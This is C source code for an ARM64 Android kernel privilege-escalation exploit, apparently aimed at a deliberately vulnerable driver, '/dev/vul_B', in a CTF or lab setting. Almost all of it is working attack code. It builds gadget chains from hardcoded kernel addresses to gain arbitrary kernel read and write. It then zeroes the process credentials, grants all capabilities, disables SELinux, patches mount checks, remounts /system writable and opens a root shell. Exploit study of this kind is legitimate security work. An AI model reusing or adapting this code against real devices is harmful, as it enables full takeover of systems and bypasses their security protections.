#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/capability.h>
#include "get_root.h"
#define MAGIC_BASE_ADDR 0x30303000
#define MAGIC_BASE_ADDR_WRITE_BASE 0x5500000000
#define MAGIC_BASE_ADDR_WRITE_1 0x5500003000
#define MEM_LEN 0x1000
long kernel_sp;
int fd;
size_t* write_map1 = (size_t *)MAGIC_BASE_ADDR_WRITE_BASE;
size_t* write_map2 = (size_t *)MAGIC_BASE_ADDR_WRITE_1;
extern int patch_selinux_by_change_switch(void *selinux_enforcing,void *selinux_enabled);
#define KERNEL_START 0xffffffc000080000
unsigned int read4bytes(size_t target_address);

void write_a_10(size_t target_address);
void write8bytes(size_t target_address, size_t content);

static int read_kernel(void *target,void *buffer,unsigned size){
	unsigned int ret,count = size/4;
	unsigned int* dest = buffer;
	unsigned int* src = target;
	unsigned int i;
	for(i=0; i<count; i++){
		*dest = read4bytes((size_t)src);
		dest++;
		src++;
	}
	return 0;
}

static int patch_cred(void *cred_addr){
	int ret;
	struct cred *cred = cred_addr;
	if(!cred){
		printf("[-]malloc cred failed\n");
		return -1;
	}
	int i;
	for(i=0;i<4;i++){
		write8bytes((size_t)&cred->uid+i*8,0);
	}
	for(i=0;i<4;i++){
		write8bytes((size_t)&cred->cap_inheritable+i*8,0xFFFFFFFFFFFFFFFF);
	}



	printf("uid : %x\n",getuid());

	return ret;
}

static void patch_selinux(){
	/*---patch selinux */
	write8bytes(0xFFFFFFC0006CCBDC-4,0);
	write8bytes(0xFFFFFFC00068C020,0);
}


static void *find_struct_cred_addr(void *task_struct_addr){
	int ret;
	struct task_struct *task;
	void *cred_addr = NULL;
	unsigned int size = 0x100*sizeof(size_t),i;
	int *taskbuf = (int *)malloc(size);
	if(!taskbuf){
		printf("[-]malloc task space failed\n");
		return NULL;
	}
	ret = read_kernel(task_struct_addr,taskbuf,size);
	if(ret == -1)
		printf("[-]copy task struct failed\n");
	else{
		for(i=0;i<size/4;i++){
			task = (struct task_struct *)&taskbuf[i];
			if(task->cpu_timers[0].next == task->cpu_timers[0].prev
				&&(unsigned long)task->cpu_timers[0].next > KERNEL_START
				&&task->cpu_timers[1].next == task->cpu_timers[1].prev
				&&(unsigned long)task->cpu_timers[1].next > KERNEL_START
				&&task->cpu_timers[2].next == task->cpu_timers[2].prev
				&&(unsigned long)task->cpu_timers[2].next > KERNEL_START
				&&task->real_cred == task->cred){
					cred_addr = task->cred;
					break;
			}
		}
	}
	if(cred_addr ==NULL){
		printf("[-]get cred address failed\n");
	}
	else{
		printf("[+]cred address : %p\n",cred_addr);
	}
	free(taskbuf);
	return cred_addr;
}

static void *get_stask_struct_addr(struct thread_info_head *thread_info){
	void *task_struct_addr = NULL;
	int ret;
	ret = read_kernel(&thread_info->task,&task_struct_addr,sizeof(struct task_struct *));
	if(ret == -1)
		printf("[-]get stask struct address failed\n");
	else
		printf("[+]task_struct : %p\n",task_struct_addr);
	return task_struct_addr;
}

int get_root(void *_thread_info){
	void *task_struct_addr,*cred_addr;
	struct thread_info_head *thread_info;
	int ret;
	thread_info = (struct thread_info_head *)_thread_info;
	task_struct_addr = get_stask_struct_addr(thread_info);
	if(!task_struct_addr){
		return 0;
	}
    cred_addr = find_struct_cred_addr(task_struct_addr);
	if(!cred_addr){
		return 0;
	}
	ret = patch_cred(cred_addr);
	return 1;
}

void patch_mount(){
	write8bytes(0xFFFFFFC0006C73A8,0xFFFFFFC0000BBDA0);//is_init_mount
	write8bytes(0xFFFFFFC0006C72D0+0xc8,0xFFFFFFC0000BBDA0);//remount_check
}

//0xFFFFFFC0006C72D0  ali_check

void debug(){
	int flag;
	void *address;
	void* data[100];
	while(1){
		printf("[+]read 1,write 0:\n");
		scanf("%d",&flag);
		printf("[+]input address:\n");
		scanf("%p",&address);
		if(flag == 1){
			read_kernel(address,data,8);
			printf("[%p] :%p\n",address,data[0]);
		}
	}
}

int main(){
	int ret;
	size_t leek_sp;
	fd = open("/dev/vul_B",O_RDWR);
	if ( fd == -1)
		perror("open:");
	size_t *buf = (size_t *)malloc(0x1000);
    void *map =  mmap((void *)MAGIC_BASE_ADDR,MEM_LEN,
	PROT_READ | PROT_WRITE | PROT_EXEC,
	MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if(map == NULL)
		perror("map:");

	write_map1 = mmap((void *)MAGIC_BASE_ADDR_WRITE_BASE,MEM_LEN*5,
	PROT_READ | PROT_WRITE | PROT_EXEC,
	MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if((size_t)write_map1 != MAGIC_BASE_ADDR_WRITE_BASE)
		perror("map:");

	memset(map,0x41,0x1000);
	memset(buf,0x41,0x18);
	buf[0] = 0xdeadbeef;  //0
	buf[1] = 0xFFFFFFC0002D3228;//FFFFFFC0002D3228;  //x7
	buf[2] = 0xFFFFFFC000330DD8;//x8  ret
	buf[3] = 0x30303000;//
	buf[4] = 0xFFFFFFC0003E9030;
	buf[5] = 0xFFFFFFC0003E9030;  //
	buf[14] = 0xFFFFFFC00016B150;
	buf[15] = 0xFFFFFFC0003EF308;
	ret = write(fd,buf,0x18);
	leek_sp = *(size_t *)((size_t)map+8);
	kernel_sp = (size_t)leek_sp & 0xFFFFFFFFFFFFC000;
	size_t addr_limit = kernel_sp + 0x8;
	printf("[+]kernel_sp : %p\n",(void *)kernel_sp);

	get_root((void *)kernel_sp);
	patch_selinux();
	patch_mount();
	system("mount -o remount,rw /system");
	system("echo 1 > /system/bin/su1");
	system("ls -l /system/bin/ | grep su");
	system("echo  [+]mount /system OK");
	system("/system/bin/sh");


	free(buf);
	return 0;
}


/*-----write 10-----*/

void write_a_10(size_t target_address){
	size_t buf[100];
	unsigned int ret;
	memset(buf,0,sizeof(buf));
	buf[0] = 0xdeadbeef;  //0
	buf[1] = 0xFFFFFFC0002D3228;//FFFFFFC0002D3228;  //x7
	buf[2] = 0xFFFFFFC000330DD8;//0xFFFFFFC000330DD8;//x8  ret
	buf[3] = target_address-0xe0;//
	buf[4] = 0xFFFFFFC000321664;
	buf[5] = 0xFFFFFFC00016B150;  //
	buf[6] = 0xFFFFFFC00016B150;


	ret = write(fd, buf, 0x18);
}

// ROM:FFFFFFC000330DD8                 LDR             X2, [X1,#8]
// ROM:FFFFFFC000330DDC                 LDR             X0, [X1]
// ROM:FFFFFFC000330DE0                 BLR             X2

// ROM:FFFFFFC000321664                 STR             W3, [X0,#0xE0]
// ROM:FFFFFFC000321668                 LDR             X1, [X1,#0x18]
// ROM:FFFFFFC00032166C                 BLR             X1



/*-------read any -----*/

unsigned int read4bytes(size_t target_address){
	size_t buf[100];
	unsigned int ret;
	memset(buf,0,sizeof(buf));
	buf[0] = 0xdeadbeef;  //0
	buf[1] = 0xdeadbeef;//0xFFFFFFC0002D3228;//FFFFFFC0002D3228;  //x7
	buf[2] = 0xFFFFFFC000330DD8;//x8  ret
	buf[3] = target_address - 0x30;//  target_address - 0x30
	buf[4] = 0xFFFFFFC0003E9030;
	buf[5] = 0xFFFFFFC0003E9030;  //
	buf[14] = 0xFFFFFFC00016B150;
	buf[15] = 0xFFFFFFC000137A5C;

	ret = write(fd, buf, 0x18);
	return ret;
}

// ROM:FFFFFFC000330DD8                 LDR             X2, [X1,#8]
// ROM:FFFFFFC000330DDC                 LDR             X0, [X1]  ;X0 = target_address - 0x30
// ROM:FFFFFFC000330DE0                 BLR             X2

// ROM:FFFFFFC0003E9030                 LDR             X2, [X1,#0x58]  ;
// ROM:FFFFFFC0003E9034                 CBZ             X2, loc_FFFFFFC0003E9048
// ROM:FFFFFFC0003E9038                 LDR             X1, [X1,#0x60]  ;x1 = 0xFFFFFFC000137A5C
// ROM:FFFFFFC0003E903C                 BLR             X1

// ROM:FFFFFFC000137A5C                 LDR             X0, [X0,#0x30]
// ROM:FFFFFFC000137A60                 BLR             X2

// 0xffffffc0002f92b0 : ldr x0, [x9] ; and x10, x3, x10 ; eor x10, x10, x0 ; str x10, [x9] ; ret
// 0xffffffc000407e88 : ldr x3, [x7, #8] ; blr x3
// 0xffffffc000137a50 : cbz x0, #0xb7a7c ; ldr x2, [x0, #0x28] ; cbz x2, #0xb7a88 ; ldr x0, [x0, #0x30] ; blr x2



/*write anywhere anything*/
void write8bytes(size_t target_address, size_t content){
	size_t *buf = write_map2;
	size_t *buf2 = (size_t *)((size_t)write_map1+0x10);
	size_t *x3 = (size_t *)((size_t)write_map1+0x500);
	size_t *st1_x3_addr = (size_t *)((size_t)write_map1+0x898);
	size_t x0[100];

	x0[26] = buf2;
	x0[5] = 0xFFFFFFC00024321C;
	x0[6] = target_address-0x8;

	buf[0] = 0xdeadbeef;
	buf[1] = 0xFFFFFFC0002D3228;  //x7
	buf[2] = 0xFFFFFFC000330DD8;
	buf[3] = &x0[0];
	buf[4] = 0xFFFFFFC0003B4834;
	buf[7] = 0xFFFFFFC00024321C;


	buf2[0] = 0xFFFFFFC00016B150;
	buf2[12] = x3;
	buf2[8] = content;
	buf2[5] = (size_t)st1_x3_addr-0x98;
	*st1_x3_addr = 0xFFFFFFC000137A54;

	x3[4] = 0xFFFFFFC0002BB1D4;
	write(fd, buf, 0x18);
}
// ROM:FFFFFFC000330DD8                 LDR             X2, [X1,#8]  ;0xFFFFFFC00036C9EC
// ROM:FFFFFFC000330DDC                 LDR             X0, [X1]     ;target - 0x8
// ROM:FFFFFFC000330DE0                 BLR             X2


// ROM:FFFFFFC0003B4834                 LDR             X3, [X0,#0xD0]
// ROM:FFFFFFC0003B4838                 MOV             X1, X3
// ROM:FFFFFFC0003B483C                 LDR             X3, [X3,#0x28]
// ROM:FFFFFFC0003B4840                 LDR             X3, [X3,#0x98]
// ROM:FFFFFFC0003B4844                 BLR             X3


// ROM:FFFFFFC000137A54                 LDR             X2, [X0,#0x28]
// ROM:FFFFFFC000137A58                 CBZ             X2, loc_FFFFFFC000137A78
// ROM:FFFFFFC000137A5C                 LDR             X0, [X0,#0x30]
// ROM:FFFFFFC000137A60                 BLR             X2



// ROM:FFFFFFC00024321C                 LDR             X3, [X1,#0x60]  ;write_map1+0x500
// ROM:FFFFFFC000243220                 LDR             X2, [X1]        ;0xFFFFFFC00016B150
// ROM:FFFFFFC000243224                 LDR             X3, [X3,#0x20]  ;0xFFFFFFC0002BB1D4
// ROM:FFFFFFC000243228                 BLR             X3


// ROM:FFFFFFC0002BB1D4                 LDR             X1, [X1,#0x40]
// ROM:FFFFFFC0002BB1D8                 ADD             W3, W22, W3
// ROM:FFFFFFC0002BB1DC                 BLR             X7

// ROM:FFFFFFC0002D3228                 STR             X1, [X0,#8]
// ROM:FFFFFFC0002D322C                 MOV             X0, X19
// ROM:FFFFFFC0002D3230                 BLR             X2


// ROM:FFFFFFC00040DCC4                 LDR             X2, [X1,#0x98]
// ROM:FFFFFFC00040DCC8                 CBZ             X2, loc_FFFFFFC00040DD2C
// ROM:FFFFFFC00040DCCC                 LDRH            W1, [X1]
// ROM:FFFFFFC00040DCD0                 BLR             X2